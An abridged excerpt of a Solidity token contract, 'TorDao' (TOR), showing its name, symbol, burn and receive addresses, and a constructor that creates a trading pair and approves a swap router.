...
contract TOR is Context, IERC20, Ownable {
    ...
    string private _name = "TorDao";
    string private _symbol = "TOR";
    uint8 private _decimals;
    address private _destroyAddress = address(0x000000000000000000000000000000000000dEaD);
    address private _receive = address(0x9EbcDf712a859D32a49d9fa12acC151f1a4f60e2);
    address _tokenOwner;
    ...
    constructor (address tokenOwner){
        ...
        _owner = _msgSender();
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xF29acE1FE5f36389d0dDe450a0195A30c3770245);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), 0x55d398326f99059fF775485246999027B3197955);
        uniswapV2Router = _uniswapV2Router;
        _approve(address(this), address(0xF29acE1FE5f36389d0dDe450a0195A30c3770245), _tTotal.mul(200));
